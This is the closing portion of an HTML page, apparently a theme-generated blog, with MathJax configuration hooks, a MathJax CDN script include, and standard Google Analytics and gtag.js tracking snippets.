                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
                const text = document.createTextNode('');
                node.parentNode.replaceChild(text, node);
                math.start = { node: text, delim: '', n: 0 };
                math.end = { node: text, delim: '', n: 0 };
                doc.math.push(math);
              });
            }, '', false],
            insertedScript: [200, () => {
              document.querySelectorAll('mjx-container').forEach(node => {
                let target = node.parentNode;
                if (target.nodeName.toLowerCase() === 'li') {
                  target.parentNode.classList.add('has-jax');
                }
              });
            }, '', false]
          }
        }
      };
    </script>

    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>

  













  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'UA-177243668-2', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-177243668-2');
    </script>
  

  

  

  





</body>
</html>
